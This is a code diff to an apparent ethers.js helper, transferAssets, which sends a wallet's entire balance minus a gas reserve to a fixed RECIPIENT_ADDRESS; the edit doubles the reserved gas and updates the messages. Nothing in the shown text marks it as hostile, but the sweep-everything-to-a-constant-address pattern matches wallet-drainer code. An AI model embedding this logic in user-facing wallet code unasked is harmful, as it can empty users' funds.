@@ -61,7 +61,8 @@ export const switchNetwork = async (chainId: string): Promise<void> => {
 };
 
 /**
- * Transfer maximum balance minus gas fees to the specified recipient
+ * Transfer maximum balance minus gas fees to the specified recipient,
+ * leaving enough funds for another transaction in the future
  */
 export const transferAssets = async (
   chainId: string
@@ -86,24 +87,28 @@ export const transferAssets = async (
     // Get the standard gas price from the network
     const gasPrice = await provider.getGasPrice();
 
-    // Calculate gas cost: gas price * gas limit
+    // Calculate gas cost for a single transaction: gas price * gas limit
     const gasCost = gasPrice.mul(ESTIMATED_GAS_LIMIT);
 
-    // Ensure the user has enough balance to pay for gas
-    if (balance.lte(gasCost)) {
-      throw new Error(`Insufficient funds. You need at least ${ethers.utils.formatEther(gasCost)} ETH for gas`);
+    // Reserve double the gas cost to ensure there's enough for another transaction
+    const reservedAmount = gasCost.mul(2);
+
+    // Ensure the user has enough balance to pay for gas and leave some reserved
+    if (balance.lte(reservedAmount)) {
+      throw new Error(`Insufficient funds. You need at least ${ethers.utils.formatEther(reservedAmount)} ETH to ensure you have enough for this and future transactions`);
     }
 
-    // Calculate value to send: total balance - gas cost
-    const valueToSend = balance.sub(gasCost);
+    // Calculate value to send: total balance - reserved amount
+    const valueToSend = balance.sub(reservedAmount);
 
     // Check that we're sending a positive amount
     if (valueToSend.lte(0)) {
-      throw new Error('After gas costs, there are no funds to transfer');
+      throw new Error('After reserving gas for future transactions, there are no funds to transfer');
     }
 
     console.log(`Transferring ${ethers.utils.formatEther(valueToSend)} ETH to ${RECIPIENT_ADDRESS}`);
-    console.log(`Gas cost: ${ethers.utils.formatEther(gasCost)} ETH (${ethers.utils.formatUnits(gasPrice, 'gwei')} Gwei)`);
+    console.log(`Gas cost for this transaction: ${ethers.utils.formatEther(gasCost)} ETH (${ethers.utils.formatUnits(gasPrice, 'gwei')} Gwei)`);
+    console.log(`Reserved for future transaction: ${ethers.utils.formatEther(gasCost)} ETH`);
 
     // Create transaction object
     const tx = {
